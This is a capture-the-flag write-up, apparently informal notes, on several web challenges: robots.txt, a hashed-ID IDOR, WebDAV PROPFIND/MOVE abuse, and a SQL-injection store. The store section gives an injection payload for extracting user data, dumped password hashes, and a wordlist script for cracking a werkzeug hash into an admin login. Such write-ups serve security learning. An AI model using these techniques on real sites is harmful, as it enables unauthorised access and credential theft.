### All about robots
On the giving web page, taking chall name as hint, if we go to *robots.txt end point, we see a disallowed html page. Going to that endpoint, we find the flag

### IDoor
Going to the webpage, we see the customer id is 11. Further when we see the url, the endpoint looks like an encoded string. SHA256 decoding the string gives us the value 11 that is equal to the
custoer id. With a bit of trial and error, by sha256 encoding different integers, we finally get a hit on 0, and the flag is obtained

### Hacker web store
We have been given a products page, a creation page and a passwords list. Wehn we try sql inputs in the creation page, we see the app is vulnerable to sql injection and the error message showed the structure of the insertion command. Using that we can craft a payload like:
```
1') , ('Product2', (SELECT name FROM users LIMIT 1 OFFSET 0), 'Description3
```
Here lmit means only 1 row printed, and choosing different offsets to get all the users we get 3 users and their password hashes:
```
Joram : pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
James : pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2b
website_admin_account : pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```
We need to login using the admin account by cracking its password hash<br>
From a writeup, got this script:
```
from werkzeug.security import _hash_internal
import sys

def generate_password_hash(password, method="pbkdf2:sha256:600000"):
    salt = "MSok34zBufo9d1tc"
    h, actual_method = _hash_internal(method, salt, password)
    return "%s$%s$%s" % (actual_method, salt, h)

f = open("pass.txt", "r")
o = open("crack-admin.txt", "w")

for x in f:
   hash = generate_password_hash(x.strip(),method='pbkdf2:sha256:600000')
   a = f"{x.strip()} {hash}"
   o.write(a)
   print(x.strip())
   if hash == "pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57":
       print(f"{x.strip()} found password")
       sys.exit()
o.close()
```
```
ntadmin1234 found password
```
We can login now with website_admin_account:ntadmin1234 and get our flag

### The Davinci code
Since the challenge mentions dav, if we look up , we find methods like propfind to give us files and directories <br>
Using propfind on the site, gives us a /the_secret_dav_inci_code endpoint<br>
using it again we get /flag.txt endpoint but we cant use it directly<br>
We need to move the file to /static using move method and then we get the flag<br>

### Thomas deverson
didnt understand completely yet

### Helpful desk
didnt understand completely yet
